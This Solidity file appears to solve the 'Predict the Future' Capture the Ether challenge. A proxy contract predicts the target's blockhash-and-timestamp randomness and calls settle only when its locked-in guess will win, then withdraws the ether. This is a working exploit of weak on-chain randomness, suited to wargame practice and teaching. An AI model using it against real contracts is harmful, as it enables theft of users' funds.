// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "../PredictTheFutureChallenge.sol";

contract PredictTheFutureProxy {
    address internal owner;
    uint8 internal guess = 0;
    bool public settled = false;

    constructor() {
        owner = msg.sender;
    }

    function lockInGuess(address deployedAt) external payable {
        require(msg.sender == owner, "Access denied");
        require(msg.value == 1 ether, "Guess costs 1 ether");

        PredictTheFutureChallenge challenge = PredictTheFutureChallenge(
            deployedAt
        );

        challenge.lockInGuess.value(1 ether)(guess);
    }

    function settle(address deployedAt) public {
        uint8 answer = uint8(
            keccak256(blockhash(block.number - 1), block.timestamp)
        ) % 10;

        if (answer == guess) {
            PredictTheFutureChallenge challenge = PredictTheFutureChallenge(
                deployedAt
            );
            challenge.settle();
            settled = true;
        }
    }

    function withdraw() public {
        require(msg.sender == owner, "Access Denied");
        owner.transfer(address(this).balance);
    }

    function() external payable {}
}
